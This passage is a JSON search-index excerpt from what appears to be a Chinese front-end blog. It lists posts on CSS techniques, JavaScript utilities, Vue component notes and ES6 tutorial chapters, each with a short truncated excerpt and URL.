阮一","lvl0":"网站","lvl1":null,"lvl2":"摘要","objectID":"23630607e40fc745f013a2a2c1cdc942","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/06.%E6%94%B6%E8%97%8F%E5%A4%B9/01.%E7%BD%91%E7%AB%99/"},{"content":"「css技巧」使用hover和attr()定制悬浮提示-demo See the Pen 【CSS：行为】使用:hover和attr()定制悬浮提示 by xugaoyi (@xugaoyi) on CodePen.","lvl0":"「css技巧」使用hover和attr()定制悬浮提示","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"f6516ab169a2354d33fac1616d21d6c5","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/50.css%E6%8A%80%E5%B7%A7%E4%BD%BF%E7%94%A8hover%E5%92%8Cattr%E5%AE%9A%E5%88%B6%E6%82%AC%E6%B5%AE%E6%8F%90%E7%A4%BA/"},{"content":"比typeof运算符更准确的类型判断 不同数据类型的Object.prototype.toString方法返回值如下。 数值：返回[object","lvl0":"比typeof运算符更准确的类型判断","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"5721f97c586f4961e9c7e9719b5910e8","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/100.%E6%AF%94typeof%E8%BF%90%E7%AE%97%E7%AC%A6%E6%9B%B4%E5%87%86%E7%A1%AE%E7%9A%84%E7%B1%BB%E5%9E%8B%E5%88%A4%E6%96%AD/"},{"content":"npm package.json属性详解 本文转自https://www.cnblogs.com/tzyy/p/5193811.html，作者：TZ","lvl0":"npm packageJson属性详解","lvl1":["技术","技术文档"],"lvl2":"摘要","objectID":"a9afc4f5104d3a1929eb3c74010450af","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/01.%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/10.npm-packagejson%E5%B1%9E%E6%80%A7%E8%AF%A6%E8%A7%A3/"},{"content":"vdoing主题效果图 PC端 首页 \u0026 目录页△ 文章详情页 \u0026 时间轴页△ 首页个性化大图 首页个性化大图△ 深色模式和阅读模式 深色模式△ 阅读模式△ 移动端 移","lvl0":"vdoing主题效果图","lvl1":null,"lvl2":"摘要","objectID":"d2f8fd610aeae1c00856e554f8fe3efb","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/04.%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/10.vdoing%E4%B8%BB%E9%A2%98%E6%95%88%E6%9E%9C%E5%9B%BE/"},{"content":"如何根据系统主题自动响应CSS深色模式 很多人喜欢选择APP或网站中的深色模式，也许他们更喜欢这样的外观，或者他们想让自己的眼睛免受疲劳。这篇","lvl0":"如何根据系统主题自动响应CSS深色模式","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"ac0a3a6c21a319266c982c9062c526f2","tags":["css"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/45.%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E7%B3%BB%E7%BB%9F%E4%B8%BB%E9%A2%98%E8%87%AA%E5%8A%A8%E5%93%8D%E5%BA%94css%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F/"},{"content":"水平垂直居中的几种方式-案例 See the Pen 水平垂直居中的几种方式 by xugaoyi (@xugaoyi) on CodePen.","lvl0":"水平垂直居中的几种方式-案例","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"b4a132bb90f8b8347a94feb41148880b","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/40.%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-%E6%A1%88%E4%BE%8B/"},{"content":"GitHub加速下载项目的方法 国内在github上克隆项目总是异常的慢，据我多次克隆观察，下载速度最快就20k/s左右，特别是在克隆比较大的","lvl0":"GitHub加速下载项目的方法","lvl1":["技术","GitHub技巧"],"lvl2":"摘要","objectID":"0c608513f1de2e740669d88fabada326","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/03.%E6%8A%80%E6%9C%AF/02.github%E6%8A%80%E5%B7%A7/10.github%E5%8A%A0%E9%80%9F%E4%B8%8B%E8%BD%BD%E9%A1%B9%E7%9B%AE%E7%9A%84%E6%96%B9%E6%B3%95/"},{"content":"JS获取和修改url参数 获取url参数 1 2 3 4 5 6 7 8 9 10 11 12 /** * 获取url里的参数 * @param arg 参数名 * @returns */ function getURLString(arg) { var reg = new RegExp(\u0026#34;(^|\u0026amp;)\u0026#34; + arg + \u0026#34;=([^\u0026amp;]*)(\u0026amp;|$)\u0026#34;, \u0026#34;i\u0026#34;); var r = window.location.search.substr(1).match(reg); if (r","lvl0":"JS获取和修改url参数","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"f68bfa9f59b78488215c6889b14c2853","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/90.js%E8%8E%B7%E5%8F%96%E5%92%8C%E4%BF%AE%E6%94%B9url%E5%8F%82%E6%95%B0/"},{"content":"防抖与节流函数 防抖和节流的作用都是在高频事件中防止函数被多次调用，是一种性能优化的方案。 区别在于，防抖函数只会在高频事件结束后n毫秒调用一次","lvl0":"防抖与节流函数","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"a8d0d24e851e37d06b9f8e7cb6002965","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/80.%E9%98%B2%E6%8A%96%E4%B8%8E%E8%8A%82%E6%B5%81%E5%87%BD%E6%95%B0/"},{"content":"从box-sizing属性入手，了解盒子模型 背景 先声明一下运用的场景，假如项目布局使用的是自适应的布局方式，div给出的宽度是百分比的形式，","lvl0":"从box-sizing属性入手，了解盒子模型","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"4f202de2a32ba60e2fbc5ecccabc82a4","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/35.%E4%BB%8Ebox-sizing%E5%B1%9E%E6%80%A7%E5%85%A5%E6%89%8B%E4%BA%86%E8%A7%A3%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/"},{"content":"文字在一行或多行时超出显示省略号 一行超出显示省略 1 2 3 overflow: hidden; white-space: nowrap; text-overflow: ellipsis; :::demo [vanilla] 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;html\u0026gt; \u0026lt;div class=\u0026#34;box-42b6\u0026","lvl0":"文字在一行或多行时超出显示省略号","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"1a9b70a49b50b474347461483350bdc1","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/30.%E6%96%87%E5%AD%97%E5%9C%A8%E4%B8%80%E8%A1%8C%E6%88%96%E5%A4%9A%E8%A1%8C%E6%97%B6%E8%B6%85%E5%87%BA%E6%98%BE%E7%A4%BA%E7%9C%81%E7%95%A5%E5%8F%B7/"},{"content":"将一维数组按指定长度转为二维数组 将一维数组按指定长度转为二维数组 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function pages(arr, len) { const pages = [] arr.forEach((item, index) =\u0026gt; { const page = Math.floor(index / len) if (!pages[page]) { pages[page]","lvl0":"将一维数组按指定长度转为二维数组","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"49b2fade051101ee41ad854f414b3f2e","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/70.%E5%B0%86%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84%E6%8C%89%E6%8C%87%E5%AE%9A%E9%95%BF%E5%BA%A6%E8%BD%AC%E4%B8%BA%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/"},{"content":"「布局技巧」图片未加载前自动撑开元素高度 在移动端开发中，有一些元素是根据图片高度来自动撑开的 ，高度不能写死（如轮播图的外层元素）。在网络较慢","lvl0":"「布局技巧」图片未加载前自动撑开元素高度","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"19862049ae01b24b587d9a40c673cd66","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/20.%E5%B8%83%E5%B1%80%E6%8A%80%E5%B7%A7%E5%9B%BE%E7%89%87%E6%9C%AA%E5%8A%A0%E8%BD%BD%E5%89%8D%E8%87%AA%E5%8A%A8%E6%92%91%E5%BC%80%E5%85%83%E7%B4%A0%E9%AB%98%E5%BA%A6/"},{"content":"ES5面向对象 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 //面向对象","lvl0":"ES5面向对象","lvl1":["前端","JavaScript文章"],"lvl2":"摘要","objectID":"33cf39eb610a9a6bd046b84bea418066","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/01.javascript%E6%96%87%E7%AB%A0/03.es5%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"},{"content":"常用meta整理 \u0026lt;meta\u0026gt; 元素 概要 meta标签提供关于HTML文档的元数据。元数据不会显示在页面上，但是对于机器是可读的。它可用于浏览器（如何显示内","lvl0":"常用meta整理","lvl1":["页面","HTML"],"lvl2":"摘要","objectID":"fef8ba83235b9b87701a2fe7ae462f5b","tags":["HTML"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/10.html/10.%E5%B8%B8%E7%94%A8meta%E6%95%B4%E7%90%86/"},{"content":"Vue CLi v3.x 创建项目使用记录 官方文档 以下使用的CLi版本是 v3.11.0 vue create 运行以下命令来创建一个新项目 1 vue create hello-world 你会被提示选取一个 preset (预设)。你可以选默认的包","lvl0":"Vue CLi v3 创建项目使用记录","lvl1":["《Vue》笔记","工具"],"lvl2":"摘要","objectID":"5469b88bc2ff1dc9a86a330a27d2dc88","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/05.%E5%B7%A5%E5%85%B7/10.vue-cli-v3-%E5%88%9B%E5%BB%BA%E9%A1%B9%E7%9B%AE%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"},{"content":"Mixin混入 基础 混入 (mixin) 提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。一个混入对象可以包含任意组件选项。当组件使用混入对象时，所有混","lvl0":"Mixin混入","lvl1":["《Vue》笔记","可复用性\u0026组合"],"lvl2":"摘要","objectID":"5675d6c46a8c3d84dc752fae40e97bfc","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/04.%E5%8F%AF%E5%A4%8D%E7%94%A8%E6%80%A7%E7%BB%84%E5%90%88/01.mixin%E6%B7%B7%E5%85%A5/"},{"content":"vue父子组件的生命周期顺序 加载渲染过程 1 父beforeCreate -\u0026gt; 父created-\u0026gt; 父beforeMount-\u0026gt; 子befo","lvl0":"vue父子组件的生命周期顺序","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"cdddb88b1d4f40f281a84c4bb6b57d88","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/90.vue%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%A1%BA%E5%BA%8F/"},{"content":"vue中使用Animate.css库 自定义过渡类名 我们可以通过以下 attribute 来自定义过渡类名： enter-class enter-active-class enter-to-class (2.1.8+) leave-class leave-active-class leave-to-class (2.1.8+) 他们的优先级高于普通的类名，这对于 Vue 的","lvl0":"使用animate库","lvl1":["《Vue》笔记","过渡\u0026动画"],"lvl2":"摘要","objectID":"b3f963b293ddbbea17414c564f6c170f","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/03.%E8%BF%87%E6%B8%A1%E5%8A%A8%E7%94%BB/112.%E4%BD%BF%E7%94%A8animate%E5%BA%93/"},{"content":"动态组件与 v-once 指令 动态组件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;div id=\u0026#34;root\u0026#34;\u0026gt; \u0026lt;component :is=\u0026#34;type\u0026#34;\u0026gt;\u0026lt;/component\u0026gt; \u0026lt;!--其效果如同下面两行被注释的代码--\u0026gt;","lvl0":"动态组件与 v-once 指令","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"346107bdbbfc8b31d334cb99110ba337","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/80.%E5%8A%A8%E6%80%81%E7%BB%84%E4%BB%B6%E4%B8%8E-v-once-%E6%8C%87%E4%BB%A4/"},{"content":"插槽slot API 插槽 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;div id=\u0026#34;root\u0026#34;\u0026gt; \u0026lt;child\u0026gt; \u0026lt;!-- 组件标签 --\u0026gt; \u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt; \u0026lt;/child\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; Vue.component(\u0026#39;child\u0026#39;, { // 子组件 template: \u0026#39;\u0026lt;div\u0026gt;\u0026lt;slot\u0026gt;\u0026lt;/slot\u0026gt;\u0026lt;/div\u0026gt;\u0026#39; }) var vm = new Vue({ el: \u0026#39;#root\u0026#39; }) \u0026lt;/script\u0026gt; 上面代码中，组件标签内的h1","lvl0":"插槽slot","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"b7b6197a7e9176a3cbd54ac9f238a0b2","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/75.%E6%8F%92%E6%A7%BDslot/"},{"content":"非父子组件间传值 当组件的嵌套多时，非父子组件间传值就显得复杂，除了使用vuex实现之外，还可以通过Bus（或者叫 总线/发布订阅模式/观察者模","lvl0":"非父子组件传值","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"9af4b546aa119a1d17b5adac14af00ba","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/65.%E9%9D%9E%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E4%BC%A0%E5%80%BC/"},{"content":"自定义事件 API 在组件标签v-on绑定的事件是自定义事件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;div id=\u0026#34;root\u0026#34;\u0026gt; \u0026lt;child @click=\u0026#34;handleClick\u0026#34;\u0026gt;\u0026lt;/child\u0026gt; \u0026lt;!--这里click是自定义事件--","lvl0":"自定义事件","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"2a2ba272b0ca6620bf171ae1915a44ab","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/55.%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6/"},{"content":"Prop 验证 与 非 Prop 的 Attribute Prop 验证 API 子组件对父组件传递来的参数进行校验 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 Vue.component(\u0026#39;my-component\u0026#39;, { props: { // 基础的","lvl0":"Prop 验证 与 非 Prop 的 Attribute","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"e8d6e4d4748f289e7dab3fd63aed1cda","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/52.prop-%E9%AA%8C%E8%AF%81-%E4%B8%8E-%E9%9D%9E-prop-%E7%9A%84-attribute/"},{"content":"使用组件的细节点 解析 DOM 模板时的注意事项 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;div id=\u0026#34;root\u0026#34;\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tbody\u0026gt; \u0026lt;row\u0026gt;\u0026lt;/row\u0026gt; \u0026lt;row\u0026gt;\u0026lt;/row\u0026gt; \u0026lt;row\u0026gt;\u0026lt;/row\u0026gt; \u0026lt;/tbody\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; Vue.component(\u0026#39;row\u0026#39;, { template: \u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;this is a row\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39; }) var vm = new Vue({ el: \u0026#39;#root\u0026#39; }) \u0026lt;/script\u0026gt; 上面代码中","lvl0":"使用组件的细节点","lvl1":["《Vue》笔记","组件"],"lvl2":"摘要","objectID":"8ee83e4bf015cb5f6c33b9a545fc15dd","tags":["Vue"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/02.%E7%BB%84%E4%BB%B6/36.%E4%BD%BF%E7%94%A8%E7%BB%84%E4%BB%B6%E7%9A%84%E7%BB%86%E8%8A%82%E7%82%B9/"},{"content":"Mixin JavaScript 语言的设计是单一继承，即子类只能继承一个父类，不允许继承多个父类。这种设计保证了对象继承的层次结构是树状的，而不是复杂的网状结构。 但是，","lvl0":"Mixin","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"18c617bf998fc80380d4441ffa022a5c","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/32.mixin/"},{"content":"SIMD 概述 SIMD（发音/sim-dee/）是“Single Instruction/Multiple Data”的缩写，意为“单指令，多数据”。它是 JavaScript 操作 CPU 对应指令的接口，你可以看做这","lvl0":"SIMD","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"00b2c06ca500bcea958e5ce57fbecf54","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/33.simd/"},{"content":"参考链接 官方文件 ECMAScript® 2015 Language Specification: ECMAScript 2015 规格 ECMAScript® 2016 Language Specification: ECMAScript 2016 规格 ECMAScript® 2017 Language Specification","lvl0":"参考链接","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"b27f5478d2416be9d8159addfb1bd1a7","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/34.%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5/"},{"content":"函数式编程 JavaScript 语言从一诞生，就具有函数式编程的烙印。它将函数作为一种独立的数据类型，与其他数据类型处于完全平等的地位。在 JavaScript 语言中，你可以采用面","lvl0":"函数式编程","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"8762f513637363d90a10b8e3708c4043","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/31.%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"},{"content":"装饰器 [说明] Decorator 提案经过了大幅修改，目前还没有定案，不知道语法会不会再变。下面的内容完全依据以前的提案，已经有点过时了。等待定案以后，需要完","lvl0":"装饰器","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"3feb1854e89d77370601791b95ea34da","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/30.%E8%A3%85%E9%A5%B0%E5%99%A8/"},{"content":"最新提案 本章介绍一些尚未进入标准、但很有希望的最新提案。 do 表达式 本质上，块级作用域是一个语句，将多个操作封装在一起，没有返回值。 1 2 3 4 { let","lvl0":"最新提案","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"3c9666aa67991e02d20104458762f027","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/29.%E6%9C%80%E6%96%B0%E6%8F%90%E6%A1%88/"},{"content":"ArrayBuffer ArrayBuffer对象、TypedArray视图和DataView视图是 JavaScript 操作二进制数据的一个接口。这些对象早就存在，属于独立的规格（","lvl0":"ArrayBuffer","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"3cb3023010e37c8458c5afe59665fdd3","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/28.arraybuffer/"},{"content":"async 函数 含义 ES2017 标准引入了 async 函数，使得异步操作变得更加方便。 async 函数是什么？一句话，它就是 Generator 函数的语法糖。 前文有一个 Generator 函数，依次读取两个文件。 1 2","lvl0":"async 函数","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"349dca2fed34da6130dbd934901c2bc9","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/20.async-%E5%87%BD%E6%95%B0/"},{"content":"Class 的基本语法 简介 类的由来 JavaScript 语言中，生成实例对象的传统方法是通过构造函数。下面是一个例子。 1 2 3 4 5 6 7 8 9 10 function Point(x, y) { this.x = x; this.y = y; } Point.prototype.toString = function () {","lvl0":"Class 的基本语法","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"3dbc026f2ef2787e98341af59d39f507","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/21.class-%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"},{"content":"Class 的继承 简介 Class 可以通过extends关键字实现继承，这比 ES5 的通过修改原型链实现继承，要清晰和方便很多。 1 2 3 4 5 class Point { } class ColorPoint extends Point { } 上面代码","lvl0":"Class 的继承","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"eb753521026d2825340f3df0aa290129","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/22.class-%E7%9A%84%E7%BB%A7%E6%89%BF/"},{"content":"Generator 函数的异步应用 异步编程对 JavaScript 语言太重要。JavaScript 语言的执行环境是“单线程”的，如果没有异步编程，根本没法用，非卡死不可。本章主要","lvl0":"Generator 函数的异步应用","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"2bbcea327d1a9f81848ef320215d2afb","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/19.generator-%E5%87%BD%E6%95%B0%E7%9A%84%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/"},{"content":"Generator 函数的语法 简介 基本概念 Generator 函数是 ES6 提供的一种异步编程解决方案，语法行为与传统函数完全不同。本章详细介绍 Generator 函数的语法和 API，它的异步编程应用","lvl0":"Generator 函数的语法","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"368409b70c69b6ef75f15dc97fe7e67b","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/18.generator-%E5%87%BD%E6%95%B0%E7%9A%84%E8%AF%AD%E6%B3%95/"},{"content":"Iterator 和 for\u0026hellip;of 循环 Iterator（遍历器）的概念 JavaScript 原有的表示“集合”的数据结构，主要是数组（Array）和对象（Object），ES6 又添加了Ma","lvl0":"Iterator 和 for-of 循环","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"390113fe085426f7be779090005cb19c","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/17.iterator-%E5%92%8C-for-of-%E5%BE%AA%E7%8E%AF/"},{"content":"let 和 const 命令 let 命令 基本用法 ES6 新增了let命令，用来声明变量。它的用法类似于var，但是所声明的变量，只在let命令所在的代码块内有效(块级作用","lvl0":"let 和 const 命令","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"10c5e971fce41d196e3f4b5c2774be34","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/02.let-%E5%92%8C-const-%E5%91%BD%E4%BB%A4/"},{"content":"Module 的加载实现 上一章介绍了模块的语法，本章介绍如何在浏览器和 Node.js 之中加载 ES6 模块，以及实际开发中经常遇到的一些问题（比如循环加载）。 浏览器加载 传统","lvl0":"Module 的加载实现","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"e9a5c088f1297deec5ba5417f1b41c64","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/24.module-%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/"},{"content":"Module 的语法 概述 历史上，JavaScript 一直没有模块（module）体系，无法将一个大程序拆分成互相依赖的小文件，再用简单的方法拼装起来。其","lvl0":"Module 的语法","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"81eff336793b91b930ecab79e8c438f8","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/23.module-%E7%9A%84%E8%AF%AD%E6%B3%95/"},{"content":"Promise 对象 Promise 的含义 Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大。它由社区最早提出和实现，ES6 将其写进了语言","lvl0":"Promise 对象","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"4778fdf8f2839ff752faa5f1414116a9","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/16.promise-%E5%AF%B9%E8%B1%A1/"},{"content":"Proxy 概述 Proxy 用于修改某些操作的默认行为，等同于在语言层面做出修改，所以属于一种“元编程”（meta programming），即对编程语言进行编程","lvl0":"Proxy","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"1b4fc473da70e358006224ad3144e59a","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/14.proxy/"},{"content":"Reflect 概述 Reflect对象与Proxy对象一样，也是 ES6 为了操作对象而提供的新 API。Reflect对象的设计目的有这样几个。 （1） **将Obj","lvl0":"Reflect","lvl1":["《ES6 教程》笔记"],"lvl2":"摘要","objectID":"5ec69ed93b82b9f0c298d741710290ce","tags":["ES6"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/07.es6-%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/15.reflect/"},{"content":"Set 和 Map 数据结构 Set 基本用法 ES6 提供了新的数据结构 Set。它类似于数组，但是成员的值都是唯一的，没有重复的值。 Set本身是一个构造函数，用来生成 Set","lvl0":"Set 和 Map 数据结构","lvl1":["《ES6 